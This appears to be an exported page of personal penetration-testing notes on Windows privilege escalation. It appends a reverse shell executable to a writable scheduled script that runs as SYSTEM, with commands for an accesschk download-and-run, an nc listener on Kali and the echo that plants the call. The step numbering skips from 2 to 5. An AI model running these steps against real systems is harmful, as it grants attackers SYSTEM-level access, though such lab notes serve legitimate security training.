<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>append a call to a reverse shell executable to the end of the scheduled script</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>append a call to a reverse shell executable to the end of the scheduled script</h1><br/><strong>Prerequisites:</strong><br />â€¢ already found a scheduled script that run as SYSTEM or high privileges<br /><br /><br />1. View the script found<br />    <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; <span style="color:#ff9d00;font-weight:700">type</span> C<span style="color:#ff9d00;font-weight:700">:\</span>DevTools<span style="color:#ff9d00;font-weight:700">\</span>CleanUp.ps1</pre></div><br />    <a href=""><img src="images/1335-1.png" alt="images/1335-1.png" /></a><br />2. From what is written inside the file this script seems like it is running as the SYSTEM user. <br />    We can check our privileges on this script using accesschk.exe:<br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; (<span style="color:#ff9d00;font-weight:700">new-object</span> System.Net.WebClient).DownloadFile(<span style="color:#3ad900;font-weight:400">&quot;https://web.archive.org/web/20071007120748if_/http://download.sysinternals.com/Files/Accesschk.zip&quot;</span>, <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Accesschk.zip&quot;</span>);<span style="color:#0088ff;font-weight:400">$ZippedFilePath</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Accesschk.zip&quot;</span>;<span style="color:#0088ff;font-weight:400">$DestinationFolder</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\&quot;</span>;[<span style="color:#7f0044;font-weight:400">void</span>] (<span style="color:#ff9d00;font-weight:700">New-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#0088ff;font-weight:400">$DestinationFolder</span> <span style="color:#ff9d00;font-weight:700">-</span>ItemType Directory <span style="color:#ff9d00;font-weight:700">-</span>Force);<span style="color:#0088ff;font-weight:400">$Shell</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#ff9d00;font-weight:700">new-object</span> <span style="color:#ff9d00;font-weight:700">-</span>com Shell.Application;<span style="color:#0088ff;font-weight:400">$Shell</span>.Namespace(<span style="color:#0088ff;font-weight:400">$DestinationFolder</span>).copyhere(<span style="color:#0088ff;font-weight:400">$Shell</span>.NameSpace(<span style="color:#0088ff;font-weight:400">$ZippedFilePath</span>).Items(),<span style="color:#333333;font-weight:400">4</span>);<span style="color:#ff9d00;font-weight:700">Invoke-Expression</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Accesschk.exe&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Eula.txt&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Accesschk.zip&quot;</span>;</pre></div><br />    As we can see below in this case we can write to this file, which means that we can insert our own commands and have run as SYSTEM(if it run as system) when the script executes.<br />    <a href=""><img src="images/1335-2.png" alt="images/1335-2.png" /></a><br />5. Backup the original script<br />    <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; <span style="color:#ff9d00;font-weight:700">copy</span> C<span style="color:#ff9d00;font-weight:700">:\</span>DevTools<span style="color:#ff9d00;font-weight:700">\</span>CleanUp.ps1 C<span style="color:#ff9d00;font-weight:700">:\</span>Temp<span style="color:#ff9d00;font-weight:700">\</span></pre></div><br />6. Start a listener on Kali.<br />    <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># nc -nvlp 53</pre></div><br />7. Use echo to append a call to our reverse shell executable to the end of the script(in this case C:\DevTools\CleanUp.ps1):<br />    <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\&gt;</span> <span style="color:#ff9d00;font-weight:700">echo</span> C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\P</span>rivEsc<span style="color:#333333;font-weight:400">\r</span>everse.exe &gt;&gt; C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\D</span>evTools<span style="color:#333333;font-weight:400">\C</span>leanUp.ps1  <span style="color:#0088ff;font-weight:400">#on Powershell this command does not work!</span></pre></div><br />8. Wait for the scheduled task to run to complete the exploit.<br />    <a href=""><img src="images/1335-3.png" alt="images/1335-3.png" /></a><br /><br /><br /><br /><br />    </div>
</body>
</html>
